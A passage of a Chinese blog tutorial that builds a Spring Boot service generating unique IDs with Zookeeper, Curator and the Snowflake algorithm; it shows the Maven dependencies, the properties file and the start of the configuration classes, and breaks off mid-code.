<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Spring Boot基于Zookeeper和Snowflake生成唯一ID完整版 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Spring Boot基于Zookeeper和Snowflake生成唯一ID完整版</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    
                        
                    
                    <p></p>
<div class="toc">
 <h3>目录</h3>
 <ul><li>
<ul>
<li><a href="#_1">一、简介</a></li>
<li><a href="#maven_11">二、maven依赖</a></li>
<li><a href="#_107">三、配置</a></li>
<li>
<ul>
<li><a href="#31_108">3.1、属性配置文件</a></li>
<li><a href="#32_129">3.2、属性配置类</a></li>
<li><a href="#33zookeeperfont_colorFF0000font__183">3.3、zookeeper配置类（<font color="#FF0000">核心</font>）</a></li>
</ul>
   </li>
<li><a href="#_234">四、详细使用</a></li>
<li>
<ul>
<li><a href="#41zookeeperClientfont_colorFF0000font__235">4.1、zookeeperClient（<font color="#FF0000">核心</font>）</a></li>
<li><a href="#42Snowflakefont_colorFF0000font__374">4.2、Snowflake算法（<font color="#FF0000">核心</font>）</a></li>
<li><a href="#43dataCenterId_510">4.3、dataCenterId定义</a></li>
<li><a href="#44servicefont_colorFF0000font__550">4.4、service层（<font color="#FF0000">核心实现</font>）</a></li>
<li><a href="#45controller_680">4.5、controller层</a></li>
</ul>
   </li>
<li><a href="#_716">五、测试</a></li>
<li>
<ul>
<li><a href="#51_717">5.1、多实例</a></li>
<li><a href="#52nginx_730">5.2、nginx转发配置</a></li>
<li><a href="#53jmeter_754">5.3、使用jmeter并发测试</a></li>
<li><a href="#54_759">5.4、测试结果</a></li>
</ul>
   </li>
<li><a href="#Snowflake_919">六、Snowflake优缺点</a></li>
<li>
<ul>
<li><a href="#61_920">6.1、优点</a></li>
<li><a href="#62_924">6.2、缺点</a></li>
</ul>
   </li>
<li><a href="#_928">结语</a></li>
</ul>
 </li></ul>
</div>
<p></p> 
<h2>
<a id="_1"></a>一、简介</h2> 
<p>  <font color="#FF0000">zookeeper</font>是一个分布式的，开放源码的分布式应用程序协调服务，它是一个为分布式应用提供一致性服务的软件，提供的功能包括：<font color="#FF0000">配置维护、域名服务、分布式同步、组服务</font>等。选择zookeeper的原因，因为<font color="#FF0000">zookeeper</font>具有以下优点：</p> 
<ul>
<li>
<font color="#FF0000">可靠性</font>：如果消息被到一台服务器接受，那么它将被所有的服务器接受。</li>
<li>
<font color="#FF0000">实时性</font>：在一定事件范围内，client能读到最新数据，如果需要最新数据，应该在读数据之前调用sync()接口</li>
<li>
<font color="#FF0000">独立性</font>：各个Client之间互不干预</li>
<li>
<font color="#FF0000">顺序性</font>：更新请求顺序进行，来自同一个client的更新请求按其发送顺序依次执行</li>
<li>
<font color="#FF0000">原子性</font>：一次数据的更新只能成功或者失败，没有其他中间状态</li>
<li>
<font color="#FF0000">最终一致性</font>：全局唯一数据视图，client无论连接到哪个server，数据视图都是一致的</li>
</ul> 
<p>  <font color="#FF0000">snowflake</font>在单机环境使用是简单高效，但是实际中遇到分布式，容器各种环境下，需要考虑的东西还是蛮多的，今天我们就实现一个简单版的。</p> 
<h2>
<a id="maven_11"></a>二、maven依赖</h2> 
<p><strong>pom.xml</strong></p> 
<pre><code class="prism language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.5.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>relativePath</span><span class="token punctuation">/&gt;</span></span> <span class="token comment">&lt;!-- lookup parent from repository --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>snowflake<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>0.0.1-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>snowflake<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Demo project for Spring Boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">&gt;</span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
        <span class="token comment">&lt;!-- 本例中你不加入容器也可以运行--&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${parent.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.zookeeper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>zookeeper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.6.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>slf4j-log4j12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>slf4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.curator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>curator-framework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>5.2.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.zookeeper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>zookeeper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>slf4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.curator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>curator-recipes<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>5.2.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.zookeeper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>zookeeper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.projectlombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>lombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.16.14<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>  我这里把<font color="#FF0000">zookeeper</font>里面的日志框架都过滤了，加入了<font color="#FF0000">lombok</font>，你们可以根据自己的需要进行相应的处理。</p> 
<h2>
<a id="_107"></a>三、配置</h2> 
<h3>
<a id="31_108"></a>3.1、属性配置文件</h3> 
<p>  我们在<font color="#FF0000">resource</font>目录下建一个<font color="#FF0000">config</font>文件夹，然后在<font color="#FF0000">config</font>目录下创建zookeeper的自定义配置文件<font color="#FF0000">zookeeper.properties</font>，主要是zookeeper连接和目录相关的配置，因为本机的配置原因，我这里就没有采用zookeeper的集群模式了，Zookeeper建议集群节点个数为奇数<font color="#FF0000">（大于等于3）</font>，只要超过一半的机器能够正常提供服务，那么整个集群都是可用的状态。</p> 
<p><strong>zookeeper.properties</strong></p> 
<pre><code class="prism language-yaml"><span class="token comment"># zookeeper服务器地址（ip+port）</span>
zookeeper.server=10.130.3.16<span class="token punctuation">:</span><span class="token number">2181</span>
<span class="token comment">#zookeeper.server=192.168.0.101:2181</span>
<span class="token comment"># 节点创建的路径约定用"/"结尾</span>
zookeeper.rootPath=/root/alian/
<span class="token comment"># 锁路径</span>
zookeeper.lockPath=/root/snowflake
<span class="token comment"># 休眠时间</span>
zookeeper.sleep<span class="token punctuation">-</span>time=1000
<span class="token comment"># 最大重试次数</span>
zookeeper.max<span class="token punctuation">-</span>retries=3
<span class="token comment"># 会话超时时间</span>
zookeeper.session<span class="token punctuation">-</span>timeout=5000
<span class="token comment"># 连接超时时间</span>
zookeeper.connection<span class="token punctuation">-</span>timeout=5000
</code></pre> 
<h3>
<a id="32_129"></a>3.2、属性配置类</h3> 
<p><strong>ZookeeperProperties.java</strong></p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>context<span class="token punctuation">.</span>properties<span class="token punctuation">.</span></span><span class="token class-name">ConfigurationProperties</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PropertySource</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Component</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Data</span>
<span class="token annotation punctuation">@Component</span>
<span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span>prefix <span class="token operator">=</span> <span class="token string">"zookeeper"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@PropertySource</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"classpath:config/zookeeper.properties"</span><span class="token punctuation">,</span> encoding <span class="token operator">=</span> <span class="token string">"UTF-8"</span><span class="token punctuation">,</span> ignoreResourceNotFound <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token comment">//读取指定路径配置文件,暂不支持*.yaml文件</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ZookeeperProperties</span> <span class="token punctuation">{<!-- --></span>

    <span class="token comment">/**
     * zookeeper服务地址
     */</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> server<span class="token punctuation">;</span>

    <span class="token comment">/**
     * 根路径
     */</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> rootPath<span class="token punctuation">;</span>

    <span class="token comment">/**
     * 分布式锁路径
     */</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> lockPath<span class="token punctuation">;</span>

    <span class="token comment">/**
     * 重试等待时间
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> sleepTime<span class="token punctuation">;</span>

    <span class="token comment">/**
     * 最大重试次数
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> maxRetries<span class="token punctuation">;</span>

    <span class="token comment">/**
     * session超时时间
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> sessionTimeout<span class="token punctuation">;</span>

    <span class="token comment">/**
     * 连接超时时间
     */</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> connectionTimeout<span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre> 
<p>  此配置类不懂的可以参考我另一篇文章：<a href="https://blog.csdn.net/Alian_1223/article/details/118891954">Spring Boot读取配置文件常用方式</a></p> 
<h3>
<a id="33zookeeperfont_colorFF0000font__183"></a>3.3、zookeeper配置类（<font color="#FF0000">核心</font>）</h3> 
<p>  为什么要使用<font color="#FF0000">Curator</font>，因为<font color="#FF0000">Curator</font>提供了简化使用<font color="#FF0000">zookeeper</font>更高级的API接口，<font color="#FF0000">CuratorFramework</font>实例都是线程安全的。它包涵很多优秀的特性：</p> 
<ul>
<li>
<font color="#FF0000">自动连接管理</font>：自动处理zookeeper的连接和重试存在一些潜在的问题，可以监控节点数据改变和获取更新服务的列表，而监控又可以自动被Cruator recipes删除</li>
<li>
<font color="#FF0000">更简洁的API</font>：提供现代流式API接口，简化了原生zookeeper方法，事件等</li>
<li>
<font color="#FF0000">Recipe实现</font>：可以应用到leader选举，分布式锁，path缓存，和watcher，分布式队列等</li>
</ul> 
<p><strong>ZookeeperConfig.java</strong></p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alian<span class="token punctuation">.</span>snowflake<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">ZookeeperClient</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>curator<span class="token punctuation">.</span></span><span class="token class-name">RetryPolicy</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>curator<span class="token punctuation">.</span>framework<span class="token punctuation">.</span></span><span class="token class-name">CuratorFramework</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>curator<span class="token punctuation">.</span>framework<span class="token punctuation">.</span></span><span class="token class-name">CuratorFrameworkFactory</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>curator<span class="token punctuation">.</span>retry<span class="token punctuation">.</span></span><span class="token class-name">ExponentialBackoffRetry</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Slf4j</span>
<span class="token annotation punctuation">@Configuration</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ZookeeperConfig</span> <span class="token punctuation">{<!-- --></span>

    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">ZookeeperProperties</span> zookeeperProperties<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Bean</span>
    <span class="token keyword">public</span> <span class="token class-name">CuratorFramework</span> <span class="token function">curatorFrameworkClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">//重试策略,ExponentialBackoffRetry(1000,3)这里表示等待1s重试，最大重试次数为3次</span>
        <span class="token class-name">RetryPolicy</span> policy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExponentialBackoffRetry</span><span class="token punctuation">(</span>zookeeperProperties<span class="token punctuation">.</span><span class="token function">getSleepTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> zookeeperProperties<span class="token punctuation">.</span><span class="token function">getMaxRetries</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//构建CuratorFramework实例</span>
        <span class="token class-name">CuratorFramework</span> curatorFrameworkClient <span class="token operator">=</span> <span class="token class-name">CuratorFrameworkFactory</span>
                <span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">connectString</span><span class="token punctuation">(</span>zookeeperProperties<span class="token punctuation">.</span><span class="token function">getServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
